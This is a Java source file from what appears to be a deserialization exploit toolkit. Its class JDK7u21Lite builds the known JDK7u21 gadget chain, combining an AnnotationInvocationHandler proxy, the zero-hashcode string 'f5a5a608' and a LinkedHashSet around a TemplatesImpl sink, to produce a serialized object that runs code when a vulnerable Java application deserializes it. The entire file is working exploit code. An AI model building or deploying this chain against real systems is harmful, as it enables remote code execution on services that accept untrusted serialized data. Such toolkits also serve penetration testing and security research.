package com.ppp.chain.jdk;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

/**
 * @author Whoopsunix
 */
@Dependencies({"JDK:JDK7u21"})
@Authors({Authors.Whoopsunix})
@Sink({Sink.TemplatesImpl})
public class JDK7u21Lite implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(JDK7u21Lite.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {

        InvocationHandler handler = KickOff.annotationInvocationHandler(new HashMap<Object, Object>());
        Reflections.setFieldValue(handler, "type", Templates.class);
        Templates proxy = KickOff.createProxy(handler, Templates.class);

        String zeroHashCodeStr = "f5a5a608";

        LinkedHashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, templates);

        Reflections.setFieldValue(handler, "memberValues", map);
        return set;
    }
}
